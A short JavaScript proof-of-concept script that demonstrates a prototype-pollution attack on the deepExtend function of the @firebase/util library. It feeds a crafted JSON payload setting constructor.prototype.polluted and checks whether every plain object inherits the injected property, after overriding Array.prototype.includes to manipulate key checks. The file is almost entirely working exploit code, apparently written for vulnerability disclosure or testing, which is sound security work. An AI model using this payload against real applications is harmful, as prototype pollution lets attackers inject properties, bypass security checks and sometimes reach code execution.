Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const util = require('@firebase/util');
var payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
const a = {
    nest: {
        number: 1,
        string: '1',
        object: { key: '1' },
        date: new Date(1),
        nest: { a: 1 }
    }
};
var result = util.deepExtend(a, payload);
console.log({}.polluted);